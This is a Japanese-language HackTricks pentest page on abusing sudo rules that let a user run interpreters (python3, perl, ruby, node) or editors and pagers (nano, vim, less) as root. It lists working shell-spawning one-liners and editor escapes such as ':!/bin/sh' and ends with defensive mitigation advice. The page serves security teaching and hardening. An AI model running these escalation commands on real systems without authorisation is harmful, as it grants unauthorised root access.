# Sudo Command Abuse

{{#include ../../banners/hacktricks-training.md}}

## Sudo で許可された interpreter

`sudo -l` でユーザーが root として interpreter を実行できる場合、直接的な code execution とみなします。interpreter は任意の code を実行するように設計されているため、`python3`、`perl`、`ruby`、`lua`、`node`、または同様の binary の実行を許可する rule は、引数が厳密に制限・検証されていない限り、通常は root command execution と同等です。

一般的な review flow:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
その他のinterpreterの例:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
正確なパスが重要です。sudo ルールで `/usr/bin/python3` が許可されている場合、検証時にはその正確なパスを使用します：
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Sudoで許可された editor

`sudo -l` によってユーザーが root としてインタラクティブな editor を実行できる場合、それを無害なファイル編集権限ではなく、コマンド実行の攻撃面として扱います。editor は、多くの場合、shell コマンドの実行、任意のファイルの読み取り・書き込み、editor 内からの外部 helper の呼び出しが可能です。

一般的な確認フロー：
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Nanoによるコマンド実行

`nano` が sudo 経由で許可されている場合、editor interface からコマンド実行に到達できる可能性があります:
```text
Ctrl+R
Ctrl+X
```
次に、以下のようなコマンドを提示します:
```bash
id
/bin/sh
```
一部のターミナルでは、interactive shellで標準ストリームをリダイレクトする必要がある場合があります：
```bash
reset; /bin/sh 1>&0 2>&0
```
キーの正確な操作手順は nano のバージョンやビルドオプションによって異なる場合がありますが、セキュリティ上の問題は同じです。エディタが root として実行され、外部コマンドを呼び出せる状態になっています。

### その他の一般的なエディタエスケープ

Vim 系のエディタでは、一般的に `:!` を使用してコマンドを実行できます：
```text
:!/bin/sh
```
`less` などの pager からも shell execution が可能です:
```text
!/bin/sh
```
## 防御上の注意点

- `sudo` を通じて interpreter や interactive editor を許可しない。
- 1つの限定的な管理操作のみを実行する、固定された root 所有の wrapper を優先する。
- interpreter が避けられない場合は、正確な script path を制限し、ユーザーが制御する引数、書き込み可能な import、`PYTHONPATH`、安全でない環境変数の保持を防止する。
- ファイル編集が必要な場合は、正確な file path に制限し、patched sudo versions と厳格な環境処理を伴う `sudoedit` の使用を検討する。
- `SETENV`、`env_keep`、書き込み可能な working directory、書き込み可能な module/import path、`NOEXEC`、`use_pty`、logging を確認する。ただし、これらを完全な sandbox とみなさない。

{{#include ../../banners/hacktricks-training.md}}
